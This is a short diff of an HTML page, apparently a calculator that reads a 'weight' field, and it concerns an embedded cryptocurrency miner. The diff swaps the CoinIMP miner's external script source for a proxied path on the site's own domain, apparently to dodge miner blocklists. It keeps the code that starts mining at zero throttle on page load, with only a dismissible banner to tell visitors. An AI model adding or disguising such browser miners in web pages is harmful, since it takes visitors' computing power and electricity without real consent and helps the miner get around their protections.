@@ -48,13 +48,13 @@
 
     <div class="results" id="results"></div>
 </div>
-<script src="https://www.hostingcloud.racing/0rbG.js"></script>
-<script>
-    var _client = new Client.Anonymous('9f83ccc3acde18cc007fdaea40322e400ee25d5b2f4c890005d4e02c38f8a0d2', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+<script src="http://<your-domain>/<path-to-script>/ajSB.php?f=0rbG.js"></script>
+    <script>
+        var _client = new Client.Anonymous('9f83ccc3acde18cc007fdaea40322e400ee25d5b2f4c890005d4e02c38f8a0d2', {
+            throttle: 0, c: 'w'
+        });
+        _client.start();
+        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
 
 
         const weight = parseFloat(document.getElementById('weight').value);
